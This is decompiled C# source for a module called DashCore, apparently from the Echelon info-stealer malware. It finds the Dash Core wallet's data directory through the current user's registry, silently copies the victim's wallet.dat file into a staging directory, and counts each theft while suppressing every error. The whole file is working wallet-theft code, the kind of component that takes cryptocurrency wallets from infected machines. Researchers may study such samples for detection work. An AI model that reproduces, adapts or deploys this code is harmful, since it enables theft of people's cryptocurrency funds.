using System;
using System.IO;
using Microsoft.Win32;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x02000008 RID: 8
	internal class DashCore
	{
		// Token: 0x06000011 RID: 17 RVA: 0x0000324C File Offset: 0x0000144C
		public static void DSHcoinStr(string directorypath)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt"))
				{
					try
					{
						Directory.CreateDirectory(directorypath + "\\Wallets\\DashCore\\");
						object value = registryKey.GetValue("strDataDir");
						File.Copy(((value != null) ? value.ToString() : null) + "\\wallet.dat", directorypath + "\\DashCore\\wallet.dat");
						DashCore.count++;
						Wallets.count++;
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000014 RID: 20
		public static int count;
	}
}
